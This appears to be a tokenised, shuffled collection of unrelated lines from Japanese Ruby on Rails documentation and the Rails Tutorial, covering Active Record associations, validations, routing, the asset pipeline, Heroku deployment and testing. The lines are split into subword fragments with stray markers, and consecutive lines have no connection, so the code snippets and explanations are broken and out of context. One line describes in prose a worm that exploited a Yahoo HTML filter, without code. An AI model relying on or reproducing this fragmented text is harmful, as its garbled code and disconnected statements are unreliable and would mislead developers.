▁この ワーム は Y a h oo の HTML / JavaScript フィルタ の 穴 を つ きました ▟ この フィルタ は 元 来 、 JavaScript が 仕 込 まれ る 可能性のある target 属性 と on load 属性 をすべて フィルタ する ようになってい ました 。
▁ 統合テスト が成功した ら 、 今度は すべての テストを 流 して ▁\ passing ▁ する かどうか 確かめ てみてください 。
▁def ▁ counter _ cache _ column
▁ 本チュートリアル では わかりやす さ を 重 ん じ ている ため 、 こうした コマンドは 短縮 せずに 表 記 しています が 、 現 実 の Rails 開発者 は ほぼ 間 違い なく 表 \ ref { table : shortcuts } の 短縮 形 を 常 用 しています 。
▁Client ▖ where (" orders _ count ▁= ▁? ", ▁params [: orders ])
▁template _ name : ▁' another ')
▁なお 、 ファクトリー では 以下の オプション を使用できます 。
▁* ▁ 等 号 の 前 後に は スペース を 置く ▟ 「 ` a = b ` 」 ではなく 「 ` a ▁= ▁b ` 」 と すること 。
▁` end _ of _ day ` メソッドは 、 その 日 の 最後の 時点 ▁( 23:59:59 ) ▁ の タイムスタンプ を返します 。
▁G lo b al ID
▁ { a : ▁1, ▁b : ▁2}▖ with _ indifferent _ access ▖ s li ce (" a ")
▁ キャッシュ が 有効 になる のは 、` ActionController :: Base ▖ perform _ caching ` を true に設定し た場合 のみ です ▟ production 環境で はデフォルトで true になります が 、 development 環境では デフォルトでは true になり ません 。
▁Client ▖ distinct ▖ pluck (: r o le )
▁c ▖ first _ name ▁= ▁' M an n y '
▁最初の ` < % ▁%> ` タグ は その中に 書かれた Ruby コード を実行します が 、 実行 結果は 出力 されません ▟ 条件 文 や ループ 、 ブロック など 出力 の 不要な 行 はこの タグ の中に 書く と よいでしょう ▟ 次の ` <%= ▁%> ` タグ では 実行 結果 が Web ページに 出力 されます 。
▁{0} リスト 8 ▖ 3 : {/0} ▁╼╼{1} リスト \ ref { code : login _ form } で生成した ログインフォーム の HTML ╼ {/1}
▁ インスタンス 述 語 が 不要な 場合 、` instance _ predicate : ▁false ` を 指定 すれば 定義され なくなります 。
▁Rails ▁3 では 常に 4 06 ▁ Not ▁A c ce p table が返されます 。
▁( クラウド IDE の場合は 、 ファイル ナ ビ ゲ ー ター で 矢 印 をクリックして サンプル アプリ の ディレクトリ を開き 、\ k ode { Gemfile } アイコン を ダ ブ ル クリック します ) 。
▁ { a : ▁1 } ▖ with _ indifferent _ access ▖ except (: a ) ▁# ▁=> ▁ { }
▁Article ▖ where ▖ not ( author : ▁author )
▁$ ▁rails ▁-- version
▁* ▁` config ▖ active _ record ▖ record _ timestamp s ` は 、 モデル で 発生 する ` create ` 操作 や ` update ` 操作 に タイムスタンプ を 付ける かどうか を指定する 論理値 です 。
▁この リクエスト は 、 特定の コントローラ 内 アクションに マッチ させる よう ルーター に 要求 しています 。
▁< th ></ th >
▁ 本番環境で は SSL を使う ように 修正 する
▁` instance _ value s ` メソッドは ハッシュ を返します ▟ インスタンス変数 名 から " @ " を 除 いた もの が ハッシュの キー に 、 インスタンス変数 の 値が ハッシュ の値 に マ ッ プ されます 。
▁ パスワード
▁ ところで 、 テスト の実行 には ある程度 時間 が か か ります ▟ これ には 2 つの 要 因 が 絡 んで います : ▁ (1) ▁\ emph { Spring ▁server } を 起動 して Rails 環境 を 事前 読み込み するのに 時間がかかる ▟ ただし これは 最初の 1 回 だけです ▟ (2) ▁Ruby そのもの の 起動 に 時間がかかる
▁ クラスは 、\ emph { 関数 } ▁(\ emph { メソッド } とも 呼 ば れ ます ) ▁ を まとめると き に 便利な 手法 です ▟ 今回 の例では 、\ k ode { de f } という キーワード を使って 、\ k ode { home } アクション や \ k ode { help } アクション を定義し ています 。
▁ 新しい Micropost オブジェクト を返す ▁(\ k ode { user _ id ▁= ▁user ▖ id }) 。
▁ 静的なページ の アクション や ビュー をいくつか 作成 できたので 、 今度は それを \ emph { ほんの 少しだけ } 動的 に してみましょう ▟ ページ の内容 に応じて 、 ページの タイトル を 自 ら 書き換えて 表示する ようにします 。
▁なお 、\ k ode { activation \_ token } は 仮 の 属性 で しか ないので ▁(\ ref { sec : account _ activations _ resource }) 、 データベースの ユーザーは この 値を 実際には 持 って いません 。
▁作成した コードをリスト \ ref { code : remember _ digest _ should _ not _ be _ blank } に示します
▁-- ---
▁上のコードによって以下 が生成されます 。
▁` validates _ associated ` のデフォルト エラーメッセージ は ▁_" is ▁invalid " _ ▁ です 。
▁\ k ode { image \_ tag } の 効果 を確かめるため に 、 ブラウザから 生成された HTML を見てみましょう
▁最初に ユーザー メイラー に \ k ode { password \_ reset } メソッド を作成し ▁( リスト \ ref { code : mail _ password _ reset }) 、 続いて テキスト メールの ビューテンプレート ▁( リスト \ ref { code : password _ reset _ text }) ▁ と ▁HTML メールの ビューテンプレート ▁( リスト \ ref { code : password _ reset _ html }) ▁ をそれぞれ 定義 します 。
▁Rails 貢献 者 が ドキュメント を作成する 場合 、 その API を 外部 開発者 に 公開 して よい かどうか に 常に 注意 を 払 う 必要があります 。
▁ 開発 中に 動作 が お か しく な った り プロセス が フ リ ー ズ している と 思 え たら 、 すぐに \ text tt { p s ▁aux } で 状態 を 確認し 、\ text tt { kill ▁- 15 ▁< p id > } や \ text tt { p kill ▁- 15 ▁- f ▁< プロセス 名 > } で ク リ ー ン アップ しましょう 。
▁第 \ ref { cha : a _ toy _ app } 章で 簡 易 的な マイクロポスト 投 稿 フォーム に 触れ ましたが 、 この章 では 、\ ref { sec : microposts _ resource } で 記 述 した Micropost データモデル を作成し 、 User モデルと \ k ode { has \_ many } および \ k ode { belongs \_ to } メソッドを使って 関連付けを 行い 、 さらに 、 結果を 処理 し 表示 するために必要な フォーム と その 部品 を作成します ▁(\ ref { sec : micropost _ images } で 画像 の アップロード も 実装します ) 。
▁* ▁` collection ▖ empty ?
▁また 、 後 半 の 2 つ の例では 、\ k ode { map } の ブロック 内で 宣言 した 引数 ▁( cha r ) ▁ に対して メソッドを 呼び出し ています ▟ こういった ケース では 省略 記 法 が 一般的 で 、 以下のように 書く こともできます 。
▁ここで 、 有効化トークン と メール をそれぞれ {0} params [: id ] {/0} と {0} params [: email ] {/0} で 参 照 できる ▁( { p 1 }) ▁ ことを 思い 出 してみましょう 。
▁最初の リクエスト を受け ると 、 アセット は 上 述 の development 環境 の ところで 説明したとおり に コンパイル および キャッシュ されます ▟ ヘルパー で使用される マニフェスト 名 には M D 5 ハッシュ が含まれます 。
▁ コ スト フ ァ ク ター のデフォルト 値は 速 度 より セキュア であること を 重 視 しています ▟ これは 本番環境で は 最適です が 、 テスト 環境では 不 利 です ▟ 私たちは テストを \ emph { 高速 で } 行いたい の であり 、 ユーザーの パスワード ハッシュの セキュリティ については テスト 中 は 気 にした く ありません 。
▁self を省略した 結果を リスト \ ref { code : updated _ error _ messages _ partial } に示します 。
▁" following " ▁ 関連の メソッド
▁# ▁order ▁by ▁providing ▁the ▁ seed , ▁which ▁is ▁ print ed ▁after ▁each ▁run ▖
▁この 定義 が どのように 読み込まれる か を見てみましょう 。
▁`: instance _ reader ` が ` false ` の場合 、 インスタンス 述 語 は reader メソッド と同様に ` NoMethodError ` を返します 。
▁# ▁2▖ even ?
▁` config ▖ action _ mailer ` には 多数の 設定 オプション があります 。
▁デフォルトでは 、 ▖ coffee ファイル と ▖ scss ファイルは 自動 では プリコンパイル されません 。
▁Rails は 最初に この テンプレート を探し ます 。
▁Rails で サポート されている 関連付け は 以下の 6 種類 です 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / k ernel / re port ing ▖ rb ` です 。
▁ 新しい コントローラの 作成 は 第 \ ref { cha : a _ toy _ app } 章で 行います 。
▁ アプリケーションを 開発 しながら \ emph { テストスイート } を み っ ち り 作成 しておけば 、 い ざ という ときの セ ー フ テ ィ ネ ッ ト にも なり 、 それ 自体 が アプリケーションの ソースコード の 「 実行 可能な ドキュメント 」 にも なります 。
▁ ハッシュの 中の ハッシュ
▁# ▁ユーザー 変数 を作成するための コード に置き換える 。
▁さらに 、 正しい URL かどうか をテストする コード も 加 え ると 、 リスト \ ref { code : following _ tests } のようになります 。
▁Pass en g er を使用すると 、 アプリケーションを サブディレクトリ で 実行する のが 容易に なります 。
▁$ (' # logo ')▖ attr ▁src : ▁" <%= ▁asset _ path (' logo ▖ png ') ▁%> "
▁Rails は 現在の レイアウト を 探 索 する 場合 、 最初に 現在の コントローラ と同じ 基本 名 を持つ レイアウト が ` app / views / layouts ` ディレクトリ にある かどうか を調べ ます 。
▁NOTE : ▁この セグメント フォーマット を 必 須 に したい場合は 、 以下のように ` format : ▁true ` を指定します 。
▁use ▁ ActionDispatch :: ShowExceptions
▁`: no doc : ` の 追加 は 、 絶対に 無 断 で 行 わ ないでください ▟ ドキュメント から その メソッド や クラスの 記 述 が 失われ てしまいます 。
▁location ▁ ~ ▁ ^ / assets / ▁ {
▁` try ` メソッドは 引数 の 代りに ブロック を与え て 呼び出す こともできます ▟ この場合 オブジェクトが ` nil ` でない 場合にのみ ブロック が 実行されます 。
▁Active ▁Support では この API を 拡張 し 、 より フルパス に 近 い ( qualified ) 定数名 を 渡 せる ようにしています 。
▁redirect _ to ▁action : ▁' read _ cookie '
▁--------- --------------- ----------------
▁ 大 事 な ことは 、\ k ode { count } メソッドでは データベース上の マイクロポストを 全 部 読み だ してから 結果 の配列 に対して \ k ode { length } を呼ぶ 、 といった 無駄な 処理 は \ emph { していない } という 点 です ▟ そんな ことを したら 、 マイクロポストの 数 が 増 加 する に つ れ て 効率 が 低 下 してしまいます 。
▁Rails における エンジンの 役 割
▁\ k ode { user _ id } が アクセス 不 能 である ことを確認する テスト 。
▁### ▁` has _ and _ belongs _ to _ many ` 関連付け
▁Ruby の 経験 が まったく ない場合 、 Rails を学ぶ のは かなり 大 変 な 作業 になる でしょう 。
▁ユーザー と マイクロポストを 関連付け できた ことを思い出してください 。
▁* ▁` config ▖ action _ controller ▖ permit _ all _ parameters ` は 、 マスアサインメント される すべての パラメータを デフォルトで 許可 すること を設定します 。
▁# ▁JSON 用に パラメータを ラ ッ プ します ▟ : format に 空 配列 を設定する ことで 無効 に できます 。
▁ 先 に進む前に 、 Relationship モデルの 検証 を追加して 完全な もの に しておきましょう 。
▁I ▁shall ▁be ▁late !" ▖ truncate ( 20 , ▁omission : ▁' & hell ip ; ')
▁has _ one ▁: account , ▁-> ▁ { ▁where ▁active : ▁true ▁ }
▁たとえば 各 部分 の オプション 設定 を イニシャライザ に保存 しておき 、 フレームワーク と gem がすべて 読み 込 まれ た 後に 適用 することができます 。
▁ 対象 となる 文字列 のうち 、` position ` で 指定された 位 置 にある 文字 を返します 。
▁ 私たちは 、 既に Capybara が Web 操作 の 文法 を 直 感 的に サポート している ところ を 目 の 当 たり に して きました 。
▁上の例では 、 フラグ の デフォルト値 の 実際の 表現 が ど れ である か ▁( 訳 注 : ▁ シ ング ル ト ン の true な のか 、 true と 評価 される オブジェクト な のか ) ▁ を知る 必要はありません ▟ 従って 、 論理値 の 意味 だけ を ドキュメント に 書く べ き です 。
▁=> ▁false
▁以下の 配信 方法を 指定 可能です ▟ < ul >
▁` collection = ` メソッドは 、 指定した オブジェクト で その コレクション の内容を 置き換え ます ▟ 元 から あった オブジェクトは 削除 されます 。
▁RSpec と Capybara を使用することで 、 柔 軟 性 の高い テスト を作成 できるように なり 、 従来 手動で 行う しか なかった これらの テストを 自動化 できるようになりました 。
▁ ところで 、 公式 標準 による と メールアドレス に 完全に 一致する 正規表現 は 存在する の だ そう です ▟ しかし 、 苦 労 して 導 入 する ほど の 甲斐 はありません 。
▁#### ▁JSON ▁gem の 互換性
▁以下の メソッドでは バリデーション が トリガ され 、 オブジェクトが 有効な 場合にのみ データベースに保存 されます 。
▁この JavaScript ファイル がない と 、 ダ イ ア ログ ボックス は 表示され なくなります 。
▁module ▁N
▁詳細については 、[ Rails 国 際 化 ▁( I 18 n ) ▁API ]( i 18 n ▖ html ) ▁ を参照してください 。
▁| ▁------- ---------------- ▁| ▁- ---------------- ---------------- ---------------- ---------------- ---------------- ▁|
▁ アセットパイプライン とは 、 JavaScript や CSS の アセットを 最小化 ▁( mini fy : ▁ スペース や 改行 を 詰 め る など ) ▁ または 圧縮 して 連結 するための フレームワーク です 。
▁{0} 図 5 ▖ 8 {/0} ▁{1} \ href { http ://0▖0▖0▖0:3000/ about }{/ about } で表示される About ページ {/1}
▁このコードは 、` LE F T ▁ OUT ER ▁JOIN ` を含む クエリ を 1 つ 生成 します ▟ ` joins ` メソッドを使用して い たら 、 代りに ` INNER ▁JOIN ` を使用する クエリ が生成され ていた でしょう 。
▁( S ince ▁Ruby ▁filename s ▁typical ly ▁use ▁ s na k e ▁case , ▁the ▁Rails ▁generator ▁convert s ▁ CamelCase ▁to ▁ s na k e ▁case ▁using ▁the ▁\ href { http :// api ▖ rubyonrails ▖ org / classes / ActiveSupport / In f le c to r ▖ html # method - i - underscore }{\ text tt { underscore } } ▁method ▖)
▁なお {0}{1} 第 6 章 {/1}{/0} でも 、 以下のように \ emph { モデル } を 自動生成 する方法 を 紹介します 。
▁これで Ruby の 生の オブジェクト 出力 が 整 形 され 、 作 者 名 が表示される ようになります 。
▁> > ▁p ▖ new _ record ?
▁この テストで 重要な ことは 、 フィード に必要な 3 つの 条件 を 満 た す ことです ▟ 1 ) ▁ フォローしているユーザー のマイクロポスト が フィード に含まれている こと ▟ 2 ) ▁ 自分自身 のマイクロポスト も フィード に含まれている こと ▟ 3 ) ▁\ emph { フォロー していない } ユーザーのマイクロポスト が フィード に 含まれていない こと 。
▁User モデルに ユーザー 有効化 用の 属性 を追加する
▁ / application ▖ ( css | js ) $ / ▁ ]
▁この クエリ 文字列 ベースの 戦 略 には 多くの 問題 点 があります 。
▁\ ref { sec : email _ in _ production } では 、 SendGrid の ア ド オン が これらの 環境変数 を自動的に 設定 してくれ ましたが 、 今回は 手動で 設定 する必要があります ▟\ k ode { heroku ▁config : set } コマンド を使って 、 次のように Heroku 上の 環境変数 を設定し てください 。
▁JavaScript で 使用できる ディレクティブ は スタイルシート で も使用できます ▁( なお JavaScript と異なり スタイルシート は 明示的に インクルード される という 違い があります ) 。
▁{0} 図 11 ▖ 16 {/0} ▁{1} マイクロポストの 削除リンク と 試 作 フィード のモックアップ {/1}
▁### ▁名前付きヘルパー をオーバーライドする
▁* = ▁require _ self
▁create _ table ▁: orders ▁do ▁| t |
▁create ▁app / views / users / show ▖ json ▖ jbuilder
▁ そのため の ビュー を作成し 、` Comments Controller ` に ` destroy ` アクション を作成する必要があります 。
▁| ▁ ファイル / ディレクトリ ▁| ▁ 目的 ▁|
▁最初に 、 有効なメールアドレス と 無効な メールアドレス の コレクション に対するテスト を 行い ましょう 。
▁| ▁PATCH / PUT ▁| ▁ / kategorien / : id ▁| ▁categories # update ▁| ▁ category _ path (: id ) ▁|
▁ セッション を破棄する \ k ode { destroy } アクション も 、 引 き 続 き 同じ要領で 作成する ことにします 。
▁$ ▁rake
▁\ k ode { index } アクション で Users を ページ ネ ート する
▁つまり 、 以下のように ピ ン ポイント で require を実行する ことができます 。
▁ こうすることで 共通の トピックブランチ を 使えるように なり 、 便利です 。
▁これにより 、 それぞれの 例 の 前に ルート パス へのアクセス を実行します
▁そこで 、 以下のコード を ` title ` フィールド の すぐ 上 に追加します 。
▁### ▁` has _ and _ belongs _ to _ many ` 関連付け の詳細
▁これらの クラス では 、` validate ` メソッドが 実装 されている 必要があります ▟ このメソッドは レコードを 1 つ 引数に 取り 、 それ に対して バリデーション を実行します 。
▁# ▁ polymorphic _ url ( record ) ▁# ▁same ▁as ▁comment _ url ( record )
▁app / assets / javascripts / home ▖ js
▁* ▁` redirect _ to ` を呼び出し 、 HTTP リダイレクト コード ステータス を ブラウザに送信 する
▁ この時点で 、 master ブランチ に 変更を 取り 込 む 準備ができました 。
▁\ emph { Ruby ▁on ▁Rails チュートリアル } ▁ のモックアップ は 、 「\ href { http :// g o mock ing b ir d ▖ com } { Mo c k ing b ir d }」 という 素晴らしい モックアップ 作成 サービス で 作 ら れ ています 。
▁$ ▁ cat ▁~/ ▖ s sh / id _ rs a ▖ p ub
▁Rails の キャッシュストア は 、 Sprockets を使用して development 環境 と production 環境 の アセットを キャッシュ を使用します 。
▁person ▖ errors [: name ]
▁ 自分の P C 環境 に Ruby が インストール されていない 場合は 、[ ruby - lang ▖ org ]( https :// www ▖ ruby - lang ▖ org / ja / install ation / ) ▁ を参照 して 、 自分の 環境 に 合 う インストール 方法 を参照してください 。
▁ Factory ▁Girl で シ ー ケ ン ス を定義する 。
▁ モデルを 先に 作り 、 し ば ら く 経 過 してから 関連 を追加 で 設定 する 場合は 、` add _ column ` マイグレーション を作成して 、 必要な 外部キー を モデルの テーブル に追加する の を 忘れ ない ようにしてください 。
▁ フッター パーシャル \ k ode { _ footer ▖ html ▖ erb } にも リンク があります ▟ これらは About ページ と Contact ページ へのリンク です ▁( リスト \ ref { code : footer _ partial _ links }) 。
▁#### ▁escape _ javascript
▁ 受動的関係 を使って \ k ode { user ▖ followers } を実装する
▁上のコード を有効に するには 、` application ▖ rb ` の設定 オプション に 新しい オブジェクトを 渡します 。
▁< h 1> Edit ▁article </ h 1>
▁# ▁ アカウント を有効に する
▁( デフォルトの navbar の 色 は 、 Bootstrap ▁2▖0 から 2▖1 に 変 わ った ときに 変更 された ため 、 現在の 淡 色 の代わりに ダ ー ク な 色 調 に したい場合は \ k ode { navbar - inverse } クラス を使用する必要があります ) 。
▁ テストが 重要 である という 点 では Rails 開発者 の 意 見 は ほぼ 一致し ています が 、 細 か い 点 では 異 論 が生じ ている の も 確 か です 。
▁invoke ▁ rspec
▁\ k ode { before _ save } コールバック の 別の 実装
▁module ▁B an g B an g
▁ アカウントを有効化する 段 取り は 、 ユーザーログイン ▁(\ ref { sec : logging _ in }) 、 特に ユーザーの 記 憶 ▁(\ ref { sec : remember _ me }) ▁ と似ています 。
▁| ▁HTTP ▁ 動詞 ▁| ▁ パス ▁| ▁ コントローラ # アクション ▁| ▁名前付きヘルパー ▁|
▁self を省略した 結果を リスト \ ref { code : add _ remember _ digest _ to _ users _ generated } に示します 。
▁ delegate ▁: s tree t , ▁to : ▁: address , ▁prefix : ▁true
▁この 方法 なら 記 述 が 短 く て 済み 、 意味 も は っ き り します 。
▁ 関連付け プロキシ の 内部 を参照 するには 、` proxy _ association ` ア ク セ サ にある 以下の 3 つの 属性 を使用します 。
▁また 、 上のコード では ユーザー名 を書いて いました が 、
▁今回の場合 は 、 ユーザー コントローラの コンテキスト において 、\ emph { マイクロポスト } を ページネーション したい ため 、 明示的に \ k ode {@ microposts } 変数 を \ k ode { ▁will _ paginate } に 渡す 必要があります 。
▁$ ▁ rm d ir ▁ workspace /
▁これは 、` Engine ` クラス 内の ` isolate _ namespace ` 呼び出し によって 実現 されます 。
▁ここでは 取り 違 え を防ぐ ため 、\ k ode { logged \_ in ?} の代わりに \ k ode { is \_ logged \_ in ?} を使用して 、 ヘルパーメソッド 名 が テスト ヘルパー と Session ヘルパー で 同じ にならない ように しておきます
▁Rails が デフォルトで 出力する 結果 の MIME ▁content - type は 、 デフォルトで ` text / html ` になります ▁( ただし `: json ` を 指定した 場合には ` application / json `、`: xml ` を使用した 場合は ` application / xml ` になります ) 。
▁ これはリスト \ ref { code : add _ activation _ to _ users _ migration } で使用されていました 。
▁belongs _ to ▁: author , ▁class _ name : ▁" User "
▁#### # ▁` ago `、` since `
▁上の 例 の場合 、 Order クラスは 、 関連付けられている Customer の タイムスタンプ を 保存 時 または destroy 時に 更新 します 。
▁scaffold で生成された スタイル を適用する には 、 この レイアウト の ` < head >` タグ に 以下の行 を挿入 します 。
▁ これはリスト \ ref { code : sample _ relationships } で使用されていました 。
▁end _ of _ month ▁( at _ end _ of _ month )
▁article ▁GET ▁ / articles / : id (▖ : format ) ▁articles # show
▁ これはリスト \ ref { code : remember _ test } で使用されていました 。
▁Rails の ビュー では 、 静 的 HTML の他に ERB ▁( 埋め込み Ruby : ▁ Embedded ▁R u B y ) ▁ も 使用できる 。
▁# ▁ 今後 の ミ ュ ー テ ー ター 呼び出し 方法
▁この 設定 は 、 特に Active ▁Record の設定 に 使用されます 。
▁ エイリアス チ ェ ー ン が 行われ る 対象 を 特 徴 付ける ラベル が 選 ば れる ときに そのような 衝 突 を 回 避 するには 、 次のように します 。
▁config ▖ action _ mailer ▖ default _ options ▁= ▁ {
▁リスト { p 0} で定義した {2} account _ activation {/2} の 引数に は 有効な ▁( = 実 在 する ) ▁ユーザー オブジェクトを 渡す 必要がある ため 、 リスト \ ref { code : generated _ user _ mailer _ preview s } は このままでは 動きません 。
▁" foo \ n \ n bar "▖ indent ( 2, ▁nil , ▁true ) ▁# ▁=> ▁" ▁ foo \ n ▁\ n ▁bar "
▁> > ▁x ▁- = ▁7
▁Microposts リソース の開発 では 、 Microposts コントローラ内の アクセス制御 から 始 め る ことにしましょう 。
▁self ▖ include _ root _ in _ json ▁= ▁false
▁collection ルーティング でも member ルーティング のときと同様に `: on ` オプション を使用できます 。
▁Active ▁Record の ` new _ record ?` インスタンス メソッドを使用して 、 オブジェクトが 既に データベース 上 にある かどうかを確認 できます 。
▁Ruby ▁1▖9 の ` prev _ year ` メソッドと ` next _ year ` メソッドは 、 それぞれ 昨 年 と 来 年 の 同じ 日 と 月 を返します 。
▁ 新規ユーザー を作成する ページ
▁i ▖ save !
▁\ href { http :// www ▖ michael hartl ▖ com /}{ マ イ ケ ル ハ ート ル ▁( Michael ▁Hartl )} ▁ は 、 「\ href { http :// www ▖ railstutorial ▖ org /}{ \ emph { Ruby ▁on ▁Rails ▁ チュートリアル } }」 という 、\ href { http :// rubyonrails ▖ org /}{ Ruby ▁on ▁Rails } ▁ を使って 初めて ▁Web ▁ アプリケーションを開発する 際に 最も よく 参 考 に される 本 の 著者 です 。
▁* ▁ ハッシュの 記 法 は ▁Ruby ▁1▖9 ▁ 以降 の 書 式 を使用する 。
▁たとえば 、 `@ article ` という インスタンス変数 に 記事 が 1 つ 含 まれ ている のであれば 、 `@ article ▖ comments ` と 書く だけで その 記事 に 関連付けられている コメント をすべて 取得 する ことができる のです 。
▁### ▁ デフォルト スコープ の 変更
▁ 不要な プロセス を 排 除 するには 、\ text tt { kill } コマンドで p id を 指定 し 、 Unix の kill コード ▁(\ href { https :// en ▖ w ikipedia ▖ org / wiki / Unix _ sign al # List _ of _ sign al s } { ここでは 9 ですが システム によって 異なります }) ▁ を 発行し ます 。
▁Rails では バリデーション を簡単に 利用できる よう 、 一般に 利用 可能な ビルトイン ヘルパー が 用 意 されており 、 自 前の バリデーション メソッド を作成する ことも できる ようになっています 。
▁` to _ formatted _ s ` メソッドは 、 デフォルトでは ` to _ s ` と同様に 振る舞い ます 。
▁| ▁key ▁| ▁key _ le n ▁| ▁ ref ▁| ▁rows ▁| ▁ Extra ▁|
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / object / try ▖ rb ` です 。
▁@ see _ more ▁= ▁ video s ▖ many ?
▁* ▁この テストで 自分 は 幸 せ に な れる か 。
▁yield (: content ) ▁: ▁yield ▁%></ div >
▁# ▁1▖ o d d ?
▁ SELECT ▁* ▁FROM ▁clients ▁LIMIT ▁1
▁mail ▁= ▁Noti fi er ▖ notify ( user , ▁ ▖▖▖)
▁end
▁C ▖ new ( 0, ▁1) ▖ instance _ variable _ name s ▁# ▁=> ▁[" @ x ", ▁" @ y "]
▁format ▖ js ▁ { }
▁M ▖ parent ▁# ▁=> ▁X :: Y
▁</ tr >
▁ テ キ スタイル プロ セ ッ サ によって 作成 されていない HTML を 除 去 するには 、 : filter _ html オプション を使用してください 。
▁まずは フォーマット のバリデーション を 反 映 するためには 、\ k ode { file \_ field } タグ に \ k ode { accept } パラメータを 付 与 して 使い ます 。
▁` development ▖ rb ` の場合 。
▁これは 、 Firefox で ログアウト したときに ▁( リスト \ ref { code : user _ model _ forget }) ▁ユーザーの 記憶ダイジェスト が 削除 されているので 、 C h r o me で アプリケーション にアクセス した とき 、 最終的に 次の 文 を実行する からです 。
▁もし OS ▁X の \ href { http :// brew ▖ sh /}{ Home brew } が 使える ようになってい れば 、\ k ode { brew ▁install ▁ curl } という コマンドを 打 って \ k ode { curl } をインストール することができます 。
▁* ▁` collection << ( object , ▁ ▖▖▖)
▁上の マイグレーション ファイル には ` change ` という名前の メソッド が作成され ており 、 マイグレーション の 実行時に 呼び出され ます 。
▁その コード に 、 以下の行 がある ことに注目してください 。
▁ 新しい セッション の作成 ▁( ログイン )
▁リスト \ ref { code : micropost _ dependency } のコード が正しく 動 い ていれば 、 テストが ▁\ passing ▁ するようになります 。
▁method
▁create ▁test / controllers / welcome _ controller _ test ▖ rb
▁` redirect _ to ` メソッドは 、 この 点 において ` render ` メソッドと 根 本 的に 異なります ▟ ` redirect _ to ` メソッドは 、 別の URL に対して 改 めて リクエスト を再 送信 するよう 、 ブラウザに 指 令 を 出 す ためのものです 。
▁ アカウント有効化 や パスワード 再設定 では 、 ユーザーを 有効化 したり パスワードを 再設定 するために 一意 の URL を作成する ▟ 一意 の URL には 生成 した トークン が 使用される 。
▁true に設定する と 、 Customer クラス が 使用する テーブル名 は 複数形 の ` customers ` になります ( デフォルト ) 。
▁ ファイルが いくつか 削除され ましたが 、 この 変更 が 行われた のは 現在の 「 作業 ツリー 」 内の み なので 、 まだ コミット ▁( 保存 ) ▁ されていません 。
▁Ruby の クラス や \ k ode { self } について もっと 詳 しく 知りたい 場合は 、\ href { http :// rails t ips ▖ org /}{ Rails T ips } に 投 稿 された ▁“ \ href { http :// rails t ips ▖ org / blog / archive s / 2006 / 11 / 18 / class - and - instance - variable s - in - ruby /}{ Ruby における クラス と インスタンス変数 } ” ▁( 英語 ) ▁ を参照してください 。
▁" b ", ▁" r ", ▁" o ", ▁" f ", ▁" e ", ▁" w ", ▁" v ", ▁" m ", ▁" a ", ▁" x ", ▁" p "]
▁( 緑色 の ウ ェ ル カ ム メッセージ は 、 { p 0} で 解説 する {2} flash {/2} という 機能 を使用して 表示 しています ) 。
▁ dependent : ▁: destroy
▁この 改造 が 終 わ ると 、 デフォルトの Rails ページ は 図 \ ref { fig : riding _ rails } のように 「 hello , ▁world 」 ページ が表示されます ▟ これが この セクション での 目 標 です 。
▁詳細については GitHub に 投 稿 された 「\ href { https :// github ▖ com / blog / 92 6 - sh in y - new - commit - style s } { 最新の コミット 方法 } ▁( 英語 )」 を参照してください 。
▁ 対応 している 科 目 は Ruby ▁on ▁Rails 、 フ ロ ン ト エ ンド 開発 、 Web デザイン 、 データ サ イ エ ン ス です 。
▁( これで 、 HTML ビューの ファイルの 拡張子 が \ k ode { ▖ html ▖ erb } となっている 理由 を お わ か り いた だけ た と思います ) 。
▁$ ▁< エディタ 名 > ▁ ▖
▁最後に \ k ode { heroku ▁create } コマンドを実行 して 、 Heroku サーバー に サンプルアプリケーションの 実行 場所 を作成します ▁( リスト \ ref { code : heroku _ create }) 。
▁* ▁` set _ load _ path `: ▁この イニシャライザ は ` bootstrap _ hook ` より 前に 実行されます 。
▁ ファイル ナ ビ ゲ ー ター にある ▁( あまり 目 立 た ない ) ▁ ギ ア の アイコン
▁{0} 図 1 ▖8{/0}{1} GitHub 上の 、 無 用 な 初期 の \ k ode { README } ファイル ▟\ href { http :// railstutorial ▖ org / images / figures / rails _ readme _4_0 - full ▖ png }{( 拡大 ) }{/1}
▁ デフォルトの メッセージ は `: wrong _ length `、`: to o _ long `、`: to o _ sh or t ` オプション を使用して カスタマイズ したり 、` % { count } ` を 長さ 制限 に対応する 数値 の プレースホルダ として 使用 したり できます 。
▁ すべての オブジェクト で 使用できる 拡張機能
▁ ビルトイン のバリデーション ヘルパー だけで は 不 足 の場合 、 好 み の バリデータ や バリデーション メソッド を作成して 使用できます 。
▁has _ many ▁: line _ items , ▁-> ▁ { ▁group ▁' orders ▖ id ' ▁ },
▁ 多くの ブラウザで は 、 title タグ の内容を ブラウザ ウィンドウ の 上 部 に ウィンドウ タイトル として 表示 します ▟ title タグ は 、 いわゆる SE O ▁( search ▁engine ▁opt im i z ation : ▁ 検索 エンジン 最適化 ) ▁ において も 重要な 役 割 を 果 た します 。
▁HTML フォーム 要素を グループ 化 するための field set タグ を作成します 。
▁#### # ▁` weeks _ ago `
▁ 「 控 え め な JavaScript 」
▁match ▁' / application ▖ js ', ▁to : ▁Sprockets , ▁via : ▁: all
▁ これが 、 " Ruby では あらゆる もの が オブジェクト である " ▁ ということ の 技術 的な 意味 です 。
▁{" title "=>" First ▁article !" , ▁" text "=>" This ▁is ▁my ▁first ▁article ▖ "}
▁me g abytes
▁{0} 図 8 ▖4{/0}{1} サインイン フォーム ▁(\ href { http :// localhost :3000/ signin }{/ signin })▟ \ href { http :// railstutorial ▖ org / images / figures / signin _ form _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁本ガイドでは 、 コントローラ 、 ビュー 、 モデル によって 形 成 される 三 角 形 のうち 、 コントローラと ビューの 間 での やりとり を 中 心 に 扱 います 。
▁< ul >< li >`: address ` ▁- ▁ リモート の メール サーバー の使用 を 許可 する 。
▁sample ▁application ▖
▁ セッション は 、 RESTful な リソース として 作成 しておく と 便利です ▟ たとえば サインイン ページを \ emph { new } セッション で 、 サインイン を \ emph { create } セッション で 、 サインアウト を \ emph { destroy } セッション で それぞれ 扱 います 。
▁( これは 確 か に 紛 ら わ しい 点 です ) ▁ 。
▁t ▖ text ▁: description
▁# ▁=> ▁Sun ▁Mar ▁28 ▁01 : 59 : 59 ▁+ 0 1 00 ▁2010
▁create ▁app / views / blorgh / articles / new ▖ html ▖ erb
▁ ターミナル ▁( コマンド プロンプト とも 言い ます ) ▁ ウィンドウ を開いて ください 。
